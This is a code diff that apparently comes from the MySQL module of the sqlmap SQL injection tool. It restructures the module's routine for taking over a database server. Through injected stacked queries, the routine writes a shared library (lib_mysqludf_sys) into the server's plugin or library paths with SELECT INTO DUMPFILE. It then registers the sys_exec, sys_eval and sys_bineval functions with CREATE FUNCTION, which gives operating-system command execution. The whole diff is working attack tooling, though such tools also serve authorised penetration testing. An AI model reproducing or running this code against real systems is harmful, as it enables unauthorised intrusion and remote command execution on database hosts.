@@ -33,7 +33,6 @@ from lib.core.common import formatFingerprint
 from lib.core.common import getHtmlErrorFp
 from lib.core.common import randomInt
 from lib.core.common import randomStr
-from lib.core.common import readInput
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
@@ -62,8 +61,15 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
     """
 
     def __init__(self):
-        self.__basedir        = None
-        self.excludeDbsList   = MYSQL_SYSTEM_DBS
+        self.__basedir      = None
+        self.__datadir      = None
+        self.excludeDbsList = MYSQL_SYSTEM_DBS
+        self.sysUdfs        = {
+                                # UDF name:      UDF return data-type
+                                "sys_exec":    { "return": "int" },
+                                "sys_eval":    { "return": "string" },
+                                "sys_bineval": { "return": "int" }
+                              }
 
         Enumeration.__init__(self, "MySQL")
         Filesystem.__init__(self)
@@ -368,11 +374,6 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
         infoMsg = "the back-end DBMS operating system is %s" % kb.os
         logger.info(infoMsg)
 
-        if detailed == False:
-            self.cleanup(onlyFileTbl=True)
-
-            return
-
         self.cleanup(onlyFileTbl=True)
 
 
@@ -483,118 +484,93 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
         logger.debug(debugMsg)
 
         # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
-        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, dFile))
+        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, dFile), silent=True)
 
         if confirm == True:
             self.askCheckWrittenFile(wFile, dFile, fileType)
 
 
-    def udfInit(self):
+    def udfSetRemotePath(self):
         self.getVersionFromBanner()
 
         banVer = kb.bannerFp["dbmsVersion"]
-        dFile  = None
-        wFile  = paths.SQLMAP_UDF_PATH
-        lib    = "libsqlmapudf%s" % randomStr(lowercase=True)
 
+        # On Windows
         if kb.os == "Windows":
-            wFile += "/mysql/windows/lib_mysqludf_sys.dll"
-            libExt = "dll"
-        else:
-            wFile += "/mysql/linux/lib_mysqludf_sys.so"
-            libExt = "so"
+            # On MySQL 5.1 >= 5.1.19 and on any version of MySQL 6.0
+            if banVer >= "5.1.19":
+                if self.__basedir is None:
+                    logger.info("retrieving MySQL base directory absolute path")
 
-        for udf in ( "sys_exec", "sys_eval" ):
-            if udf in self.createdUdf:
-                continue
+                    # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
+                    self.__basedir = inject.getValue("SELECT @@basedir")
+                    self.__basedir = os.path.normpath(self.__basedir.replace("\\", "/"))
 
-            logger.info("checking if %s UDF already exist" % udf)
-
-            query  = agent.forgeCaseStatement("(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0, 1)='%s'" % (udf, udf))
-            exists = inject.getValue(query, resumeValue=False, unpack=False)
-
-            if exists == "1":
-                message  = "%s UDF already exists, do you " % udf
-                message += "want to overwrite it? [y/N] "
-                output   = readInput(message, default="N")
-
-                if output and output in ("y", "Y"):
-                    self.udfToCreate.add(udf)
-            else:
-                self.udfToCreate.add(udf)
-
-        if len(self.udfToCreate) > 0:
-            # On Windows
-            if kb.os == "Windows":
-                # On MySQL 5.1 >= 5.1.19 and on any version of MySQL 6.0
-                if banVer >= "5.1.19":
-                    if self.__basedir == None:
-                        logger.info("retrieving MySQL base directory absolute path")
-
-                        # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
-                        self.__basedir = inject.getValue("SELECT @@basedir")
-                        self.__basedir = os.path.normpath(self.__basedir.replace("\\", "/"))
-
-                        if re.search("^[\w]\:[\/\\\\]+", self.__basedir, re.I):
-                            kb.os = "Windows"
-
-                        # The DLL must be in C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin
-                        dFile = "%s/lib/plugin/%s.%s" % (self.__basedir, lib, libExt)
-
-                    logger.warn("this will only work if the database administrator created manually the '%s/lib/plugin' subfolder" % self.__basedir)
-
-                # On MySQL 4.1 < 4.1.25 and on MySQL 4.1 >= 4.1.25 with NO plugin_dir set in my.ini configuration file
-                # On MySQL 5.0 < 5.0.67 and on MySQL 5.0 >= 5.0.67 with NO plugin_dir set in my.ini configuration file
-                else:
-                    #logger.debug("retrieving MySQL data directory absolute path")
-
-                    # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_datadir
-                    #datadir = inject.getValue("SELECT @@datadir")
-
-                    # NOTE: specifying the relative path as './udf.dll'
-                    # saves in @@datadir on both MySQL 4.1 and MySQL 5.0
-                    datadir = "."
-                    datadir = os.path.normpath(datadir.replace("\\", "/"))
-
-                    if re.search("[\w]\:\/", datadir, re.I):
+                    if re.search("^[\w]\:[\/\\\\]+", self.__basedir, re.I):
                         kb.os = "Windows"
 
-                    # The DLL can be in either C:\WINDOWS, C:\WINDOWS\system,
-                    # C:\WINDOWS\system32, @@basedir\bin or @@datadir
-                    dFile = "%s/%s.%s" % (datadir, lib, libExt)
+                # The DLL must be in C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin
+                self.udfRemoteFile = "%s/lib/plugin/%s.%s" % (self.__basedir, self.udfSharedLibName, self.udfSharedLibExt)
 
-            # On Linux
+                logger.warn("this will only work if the database administrator created manually the '%s/lib/plugin' subfolder" % self.__basedir)
+
+            # On MySQL 4.1 < 4.1.25 and on MySQL 4.1 >= 4.1.25 with NO plugin_dir set in my.ini configuration file
+            # On MySQL 5.0 < 5.0.67 and on MySQL 5.0 >= 5.0.67 with NO plugin_dir set in my.ini configuration file
             else:
-                # The SO can be in either /lib, /usr/lib or one of the
-                # paths specified in /etc/ld.so.conf file, none of these
-                # paths are writable by mysql user by default
-                # TODO: test with plugins folder on MySQL >= 5.1.19
-                dFile = "/usr/lib/%s.%s" % (lib, libExt)
+                #logger.debug("retrieving MySQL data directory absolute path")
 
-            self.writeFile(wFile, dFile, "binary", False)
+                # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_datadir
+                #self.__datadir = inject.getValue("SELECT @@datadir")
 
-        for udf, retType in ( ( "sys_exec", "int" ), ( "sys_eval", "string" ) ):
-            if udf in self.createdUdf:
-                continue
+                # NOTE: specifying the relative path as './udf.dll'
+                # saves in @@datadir on both MySQL 4.1 and MySQL 5.0
+                self.__datadir = "."
+                self.__datadir = os.path.normpath(self.__datadir.replace("\\", "/"))
 
-            if udf in self.udfToCreate:
-                logger.info("creating %s UDF from the binary UDF file" % udf)
+                if re.search("[\w]\:\/", self.__datadir, re.I):
+                    kb.os = "Windows"
 
-                # Reference: http://dev.mysql.com/doc/refman/5.1/en/create-function-udf.html
-                inject.goStacked("DROP FUNCTION %s" % udf)
-                inject.goStacked("CREATE FUNCTION %s RETURNS %s SONAME '%s.%s'" % (udf, retType, lib, libExt))
-            else:
-                logger.debug("keeping existing %s UDF as requested" % udf)
+                # The DLL can be in either C:\WINDOWS, C:\WINDOWS\system,
+                # C:\WINDOWS\system32, @@basedir\bin or @@datadir
+                self.udfRemoteFile = "%s/%s.%s" % (self.__datadir, self.udfSharedLibName, self.udfSharedLibExt)
+
+        # On Linux
+        else:
+            # The SO can be in either /lib, /usr/lib or one of the
+            # paths specified in /etc/ld.so.conf file, none of these
+            # paths are writable by mysql user by default
+            # TODO: test with plugins folder on MySQL >= 5.1.19
+            self.udfRemoteFile = "/usr/lib/%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)
+
+
+    def udfCreateFromSharedLib(self, udf, inpRet):
+        if udf in self.udfToCreate:
+            logger.info("creating UDF '%s' from the binary UDF file" % udf)
+
+            ret = inpRet["return"]
+
+            # Reference: http://dev.mysql.com/doc/refman/5.1/en/create-function-udf.html
+            inject.goStacked("DROP FUNCTION %s" % udf)
+            inject.goStacked("CREATE FUNCTION %s RETURNS %s SONAME '%s.%s'" % (udf, ret, self.udfSharedLibName, self.udfSharedLibExt))
 
             self.createdUdf.add(udf)
+        else:
+            logger.debug("keeping existing UDF '%s' as requested" % udf)
 
+
+    def udfInjectCmd(self):
+        self.udfLocalFile     = paths.SQLMAP_UDF_PATH
+        self.udfSharedLibName = "libsqlmapudf%s" % randomStr(lowercase=True)
+
+        if kb.os == "Windows":
+            self.udfLocalFile   += "/mysql/windows/lib_mysqludf_sys.dll"
+            self.udfSharedLibExt = "dll"
+        else:
+            self.udfLocalFile   += "/mysql/linux/lib_mysqludf_sys.so"
+            self.udfSharedLibExt = "so"
+
+        self.udfInjectCore(self.sysUdfs)
         self.envInitialized = True
-
-        debugMsg  = "creating a support table to write commands standard "
-        debugMsg += "output to"
-        logger.debug(debugMsg)
-
-        self.createSupportTbl(self.cmdTblName, self.tblField, "longtext")
 
 
     def uncPathRequest(self):
